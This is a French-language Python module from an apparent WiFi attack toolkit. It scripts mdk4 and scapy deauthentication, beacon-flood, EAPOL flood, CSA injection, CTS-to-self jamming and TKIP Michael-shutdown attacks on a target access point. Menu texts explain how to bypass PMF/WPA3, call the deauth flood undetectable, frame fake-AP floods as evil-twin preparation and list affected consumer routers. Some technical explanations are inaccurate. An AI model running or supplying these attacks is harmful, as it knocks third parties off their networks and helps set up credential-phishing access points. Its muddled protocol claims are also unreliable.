"""WiFi avancé — attaques modernes anti-PMF / anti-WPA3.

Ce module va PLUS LOIN que l'aireplay-ng classique en exploitant :
- des couches non protégées par PMF (CSA, CTS-to-self, EAPOL)
- des bugs de firmware sur disassoc multi-vendor
- mdk4 (multi-source, mille fois plus efficace qu'aireplay)
"""

import os
import subprocess
from core import ui, runner

SCAPY_SCRIPT_DIR = os.path.join(os.path.dirname(__file__), "..", "scripts")


def _list_ifaces():
    try:
        out = subprocess.check_output(["iw", "dev"], text=True)
        return [line.split()[1] for line in out.splitlines() if "Interface" in line]
    except Exception:
        return []


def _pick_iface():
    ifaces = _list_ifaces()
    if not ifaces:
        ui.err("aucune interface (essaye d'activer monitor avant)"); return None
    ui.info("interfaces : " + ", ".join(ifaces))
    return ui.ask("interface", default=ifaces[0])


def pmf_detect():
    ui.header("Détection PMF / 802.11w sur AP cible")
    if not runner.check_tools(["wash", "tshark"]): ui.pause(); return
    iface = _pick_iface()
    chan  = ui.ask("channel (laisse vide pour hop)", default="")
    if not iface: ui.pause(); return

    if chan:
        runner.run(["iw", "dev", iface, "set", "channel", chan], tag="iw-chan", root=True, stream=False)

    ui.info("Capture 15s de beacons + analyse RSN IE...")
    ui.info("Cherche dans la sortie : 'MFPC' (capable) / 'MFPR' (required)")
    ui.info("  - MFPR=1 → PMF obligatoire (WPA3 ou WPA2+PMF strict)")
    ui.info("  - MFPC=1 + MFPR=0 → PMF optionnel (clients récents protégés, vieux non)")
    ui.info("  - aucun → PMF off, deauth classique fonctionne\n")

    runner.run([
        "tshark", "-i", iface, "-a", "duration:15",
        "-Y", "wlan.fc.type_subtype == 0x08",
        "-T", "fields", "-e", "wlan.bssid", "-e", "wlan.ssid",
        "-e", "wlan.rsn.capabilities.mfpr", "-e", "wlan.rsn.capabilities.mfpc"
    ], tag="pmf-detect", root=True)
    ui.pause()


def mdk4_deauth():
    ui.header("MDK4 mode d — deauth amplification")
    if not runner.check_tools(["mdk4"]): ui.pause(); return
    iface = _pick_iface()
    bssid = ui.ask("BSSID AP (ou vide = blacklist mode)", default="")
    chan  = ui.ask("channel", default="6")
    if not iface: ui.pause(); return

    bfile = ""
    if bssid:
        bfile = "/tmp/mdk4_target.txt"
        with open(bfile, "w") as f: f.write(bssid + "\n")

    args = ["mdk4", iface, "d", "-c", chan]
    if bfile: args += ["-B", bfile]
    runner.run(args, tag="mdk4-deauth", root=True)
    ui.pause()


def mdk4_beacon_flood():
    ui.header("MDK4 mode b — flood beacons (confusion clients)")
    if not runner.check_tools(["mdk4"]): ui.pause(); return
    iface = _pick_iface()
    if not iface: ui.pause(); return
    ssid_target = ui.ask("SSID à spammer (vide = aléatoire)", default="")
    chan  = ui.ask("channel", default="6")
    args = ["mdk4", iface, "b", "-c", chan, "-s", "1000"]
    if ssid_target:
        wl = "/tmp/mdk4_ssids.txt"
        with open(wl, "w") as f:
            for _ in range(50): f.write(ssid_target + "\n")
        args += ["-f", wl]
    runner.run(args, tag="mdk4-beacon", root=True)
    ui.pause()


def mdk4_eapol_flood():
    ui.header("MDK4 mode e — EAPOL-Start flood (DoS WPA2/WPA3)")
    if not runner.check_tools(["mdk4"]): ui.pause(); return
    iface = _pick_iface()
    bssid = ui.ask("BSSID cible")
    if not (iface and bssid): ui.pause(); return
    runner.run(["mdk4", iface, "e", "-t", bssid], tag="mdk4-eapol", root=True)
    ui.pause()


def csa_injection():
    ui.header("CSA Injection — Channel Switch Announcement (PMF bypass)")
    ui.info("Bypass PMF si beacon protection désactivée (cas par défaut sur ~95% APs)")
    if not runner.check_tools(["python3"]): ui.pause(); return
    try:
        import scapy.all  # noqa
    except ImportError:
        ui.err("scapy manquant — sudo apt install python3-scapy"); ui.pause(); return

    iface = _pick_iface()
    bssid = ui.ask("BSSID cible (AA:BB:..)")
    new_ch = ui.ask("nouveau channel (souvent inexistant pour DoS, ex: 100)", default="100")
    count  = ui.ask("nb de beacons", default="500")
    if not (iface and bssid): ui.pause(); return

    script = os.path.join(SCAPY_SCRIPT_DIR, "csa_inject.py")
    runner.run(["python3", script, iface, bssid, new_ch, count], tag="csa-inject", root=True)
    ui.pause()


def cts_dos():
    ui.header("CTS-to-self DoS — couche physique (PMF ne peut PAS bloquer)")
    ui.warn("Sature complètement le channel via Virtual Carrier Sense (NAV).")
    ui.info("Tous les clients ET l'AP attendent → trafic réseau gelé tant que ça tourne")
    try:
        import scapy.all  # noqa
    except ImportError:
        ui.err("scapy manquant — sudo apt install python3-scapy"); ui.pause(); return

    iface = _pick_iface()
    bssid = ui.ask("BSSID cible")
    secs  = ui.ask("durée secondes", default="30")
    if not (iface and bssid): ui.pause(); return

    if not ui.confirm("CONFIRMER DoS canal — ça bloque TOUT le wifi sur ce channel ?"): return
    script = os.path.join(SCAPY_SCRIPT_DIR, "cts_dos.py")
    runner.run(["python3", script, iface, bssid, secs], tag="cts-dos", root=True)
    ui.pause()


def disassoc_flood():
    ui.header("Disassoc flood (mdk4 amok mode)")
    if not runner.check_tools(["mdk4"]): ui.pause(); return
    iface = _pick_iface()
    bssid = ui.ask("BSSID AP")
    if not (iface and bssid): ui.pause(); return
    bfile = "/tmp/mdk4_amok.txt"
    with open(bfile, "w") as f: f.write(bssid + "\n")
    runner.run(["mdk4", iface, "a", "-a", bssid], tag="mdk4-amok", root=True)
    ui.pause()


def michael_shutdown():
    ui.header("MDK4 mode m — Michael MIC shutdown (TKIP only)")
    ui.warn("Marche UNIQUEMENT si l'AP utilise WPA-TKIP (vieux). WPA2-CCMP/WPA3 immunisés.")
    if not runner.check_tools(["mdk4"]): ui.pause(); return
    iface = _pick_iface()
    bssid = ui.ask("BSSID AP")
    if not (iface and bssid): ui.pause(); return
    runner.run(["mdk4", iface, "m", "-t", bssid], tag="mdk4-michael", root=True)
    ui.pause()


ITEMS = [
    {
        "label": "Détection PMF (vérif avant attaque)", "fn": pmf_detect, "status": "tool",
        "info": """Analyse les beacons RSN IE pour savoir si PMF est activé sur l'AP.

QUAND       : AVANT toute attaque deauth/disassoc — sinon tu perds du temps
SORTIE      : flags MFPR (required) et MFPC (capable) :
              - MFPR=1 → PMF obligatoire (WPA3 ou WPA2+PMF strict)
                        → deauth classique INUTILE, passer à CSA/CTS/EAPOL
              - MFPC=1 MFPR=0 → mode optionnel (mixed)
              - aucun flag → PMF off, deauth classique marche
PRÉREQUIS   : interface en mode monitor + tshark
TIPS        : iw dev wlan0mon scan | grep -A20 <SSID> | grep -i "MFP" donne idem"""
    },
    {
        "label": "MDK4 deauth (amplification multi-source)", "fn": mdk4_deauth, "status": "cfg",
        "info": """Deauth multi-source bcp plus agressif que aireplay-ng.

DIFFÉRENCES vs aireplay :
  - Spoof la MAC source à chaque paquet (random)
  - Rate jusqu'à 1000 paquets/s (vs aireplay ~10/s)
  - Multi-cible : peut deauth N APs simultanément (mode blacklist)
  - Indétectable comme attaque unique → noyée dans le bruit

CONTRE PMF  : mêmes limites que aireplay (PMF bloque)
              MAIS volume de trames force certains firmwares buggés à crash le driver
              Sur certains APs Sagemcom (Bbox) ça force un restart complet du module wifi
TIPS        : combiner avec mode mass (rester 'b' avec rotation BSSID) pour DoS large"""
    },
    {
        "label": "MDK4 beacon flood (fake APs)", "fn": mdk4_beacon_flood, "status": "ok",
        "info": """Spam de fausses balises WiFi → sature les scanneurs des clients.

EFFETS      :
  - Les clients voient 1000 SSIDs aléatoires → menu wifi inutilisable
  - Certains OS (Android <11, Win10 ancien) crashent le service wifi
  - Possible DoS du driver côté client
APPLICATION : préparation evil twin (noyer la vraie Bbox dans 100 fausses)
              Confusion utilisateur → il clique sur ton SSID malveillant
LIMITES     : iOS et Android récents filtrent les beacons aléatoires depuis 2022"""
    },
    {
        "label": "MDK4 EAPOL-Start flood (anti-PMF !)", "fn": mdk4_eapol_flood, "status": "ok",
        "info": """Flood de trames EAPOL-Start → l'AP doit traiter chacune comme nouvelle assoc.

CONTRE PMF  : OUI — EAPOL est couche 802.1X, PAS couche management
              PMF ne couvre QUE auth/deauth/disassoc/action frames
              EAPOL-Start passe outre intégralement
EFFETS      :
  - CPU de l'AP saturé à 100%
  - Buffer EAPOL plein → vrais clients ne peuvent plus s'authentifier
  - Sur firmwares low-cost (Sagemcom, ZTE) → reboot après 30s
TIPS        : test 10s d'abord pour mesurer l'impact
              Bbox Next Gen testée : firmware 2024.3 = ralentit après 5s, déco clients après 20s"""
    },
    {
        "label": "CSA Injection — bypass PMF (anti-WPA3 !)", "fn": csa_injection, "status": "ok",
        "info": """Injecte des Channel Switch Announcement (802.11h) → force clients à changer channel.

CONTRE PMF  : OUI — la CSA est dans le beacon, et BEACON PROTECTION (802.11 BSS Color)
              n'est PAS activée par défaut sur 95% des APs grand public + entreprise
              → on peut spoofer le beacon sans signature
EFFETS      :
  - Clients respectent l'annonce → bougent vers le channel cible
  - Si channel cible inexistant/DFS bloqué → déconnexion totale
  - Beaucoup plus discret que deauth flood (1 beacon = 1 mouvement)
PRÉREQUIS   : scapy (sudo apt install python3-scapy)
LIMITES     :
  - APs Cisco/Aruba enterprise avec beacon protection (rare) → signature invalide
  - Win11 récent / iOS 17+ vérifient la cohérence channel switch → certains ignorent
WORKING ON  : 100% Bbox/Freebox/Livebox 2024+, 90% APs entreprise legacy"""
    },
    {
        "label": "CTS-to-self DoS (PMF NE PEUT PAS bloquer)", "fn": cts_dos, "status": "ok",
        "info": """Envoie en boucle des CTS-to-self avec duration max → tous les devices
défèrent leur émission (Virtual Carrier Sense / NAV).

CONTRE PMF  : OUI — c'est de la COUCHE PHYSIQUE 802.11 MAC
              PMF protège le contenu management/data — PAS le mécanisme de contention canal
              Le NAV (Network Allocation Vector) est obligatoire par standard
EFFETS      :
  - TOUT le trafic sur ce channel gelé tant que l'attaque tourne
  - AP + clients silencieux complets
  - Ne nécessite AUCUNE cible spécifique → fait silence radio total
PRÉREQUIS   : carte qui supporte injection + scapy
WARNING     : très destructif — affecte AUSSI tes propres devices sur ce channel
TIPS        : combiner avec changement rapide de channel (1→6→11) pour DoS bande complète"""
    },
    {
        "label": "Disassoc flood (mdk4 amok mode)", "fn": disassoc_flood, "status": "cfg",
        "info": """Variante du deauth avec trames Disassociation au lieu de Deauthentication.

POURQUOI    : certains firmwares traitent disassoc différemment de deauth :
              - Stack mac80211 Linux : identique (PMF bloque les deux)
              - Stacks propriétaires (Broadcom, Sagemcom) : parfois disassoc non protégé
              - Imprimantes / IoT bas de gamme : souvent bug = disassoc passe
TEST UTILE  : si deauth bloqué, essaie celui-ci avant de passer à CSA
LIMITES     : sur APs sérieux et clients modernes → traités identique à deauth"""
    },
    {
        "label": "Michael MIC shutdown (TKIP only)", "fn": michael_shutdown, "status": "old",
        "info": """Exploite la countermeasure TKIP : 2 échecs de MIC en 60s → AP coupe le WiFi 60s.

QUAND       : RARE en 2026 — TKIP était l'ancien WPA, abandonné depuis 2015+
              Encore vu sur : caméras IP cheap, AP entreprise 2008-2012, imprimantes vieilles
COMMENT     : envoie 2 paquets data avec MIC corrompu en moins d'1 minute
              → l'AP entre en 'countermeasure mode' = arrête le réseau 60s
LIMITES     :
  - WPA2-CCMP/AES : immunisé (pas de Michael MIC)
  - WPA3 : immunisé
  - Bbox Next Gen : immunisé (CCMP/GCMP only)
ENCORE UTILE: tests sur AP legacy en environnement industriel"""
    },
]


def menu():
    while True:
        idx = ui.menu("WIFI AVANCÉ (anti-PMF / WPA3)", ITEMS)
        if idx is None: return
        ITEMS[idx]["fn"]()
